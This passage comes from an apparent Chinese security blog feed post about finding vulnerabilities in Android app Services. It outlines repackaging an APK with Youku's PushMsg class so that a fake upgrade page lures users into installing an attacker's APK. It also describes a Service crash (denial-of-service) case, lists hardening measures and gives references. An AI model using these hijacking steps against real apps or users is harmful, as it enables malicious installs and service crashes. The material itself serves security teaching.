class="line">其中PushMsg类不需要完整实现，只需要编译通过即可；</span><br><span class="line"><span class="number">2.</span>反编译优酷客户端的App得到smali代码，从中提取出PushMsg.smali；</span><br><span class="line"><span class="number">3.</span>反编译上述创建的APK文件，将原PushMsg类的smali文件替换为优酷中的PushMsg.smali文件，重新打包签名；</span><br><span class="line"><span class="number">4.</span>安装并运行重打包后的APK，会看到优酷的升级页面触发，如果设计的好的话，是可以诱导用户安装攻击者指定的APK文件的。</span><br></pre></td></tr></table></figure><h3 id="4-拒绝服务攻击"><a href="#4-拒绝服务攻击" class="headerlink" title="4.拒绝服务攻击"></a>4.拒绝服务攻击</h3><h4 id="（1）原理介绍-3"><a href="#（1）原理介绍-3" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃。主要体现在给Service传输的intent或者传输序列化对象导致接收时候的类型传化异常。</span><br></pre></td></tr></table></figure><p>Service拒绝服务攻击和Activity拒绝服务攻击的原理一样，可以参考我们上篇帖子</p><h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例：<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048028"><strong>雪球最新Android客户端存在空指针异常及信息泄露漏洞</strong></a></p><p>漏洞描述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">雪球客户端版本：4.1</span><br><span class="line">adb shell 下执行下面命令，虚拟机将崩溃。愿意在于空指针调用</span><br></pre></td></tr></table></figure><p>攻击样例：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/5.png" alt="image-20210908160946499"></p><h2 id="四、Service的安全防护"><a href="#四、Service的安全防护" class="headerlink" title="四、Service的安全防护"></a>四、Service的安全防护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安全防护：</span><br><span class="line">（<span class="number">1</span>）私有service不定义intent-filter并且设置exported为<span class="literal">false</span></span><br><span class="line">（<span class="number">2</span>）公开的service设置exported为<span class="literal">true</span>，intent-filter可以定义或者不定义</span><br><span class="line">（<span class="number">3</span>）合作service需对合作方的app签名做校验</span><br><span class="line">（<span class="number">4</span>）只被应用本身使用的service应设置为私有</span><br><span class="line">（<span class="number">5</span>）service接收的数据需要谨慎处理</span><br><span class="line">（<span class="number">6</span>）内部service需要使用签名级别的protectionLevel来判断是否未内部应用调用</span><br><span class="line">（<span class="number">7</span>）不应在service创建（onCreate方法被调用）的时候决定是否提供服务，应在onStartCommand/onBind/onHandleIntent等方法被调用时做判断</span><br><span class="line">（<span class="number">8</span>）当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险</span><br><span class="line">（<span class="number">9</span>）有明确的服务需调用时使用显示意图</span><br><span class="line">（<span class="number">10</span>）尽量不发送敏感信息</span><br><span class="line">（<span class="number">11</span>）启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签</span><br></pre></td></tr></table></figure><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文对Android APP的service漏洞挖掘做了一个初步的总结，并且对service的工作原理做了一个初步讲解。一些样本漏洞可能比较老，作为初步学习使用，后续会陆续补充一些新的相关漏洞案例，很多service漏洞在android版本升级后，可能不复存在，所以这里只是初步的总结学习记录。</p><h2 id="六、参考网址"><a href="#六、参考网址" class="headerlink" title="六、参考网址"></a>六、参考网址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Android第一行代码</span><br><span class="line">https://github.com/WooyunDota/DroidDrops</span><br><span class="line">https://segmentfault.com/a/1190000011325759</span><br><span class="line">https://blog.csdn.net/NewActivity/article/details/103243638</span><br><span class="line">https://tech.meituan.com/2017/09/14/android-binde-kcon.html</span><br><span class="line">https://blogs.360.cn/post/android-app%E9%80%9A%E7%94%A8%E5%9E%8B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;今天总结Android APP漏洞挖掘四大组件中service漏洞挖掘的知识，希望能通过这系列的文章，对Android APP漏洞挖掘进行一个更加深入的了解，Android APP中Service的漏洞挖掘和我们前文讲的Activity漏洞挖掘差不多，所以部分知识可以参考上篇帖子&lt;a href=&quot;https://bbs.pediy.com/thread-269211.htm&quot;&gt;Android APP漏洞之战（1）——Activity漏洞挖掘详解&lt;/a&gt;。在Service漏洞挖掘中，会逐一列出最基本的漏洞特征，后续会逐步补充相关的漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
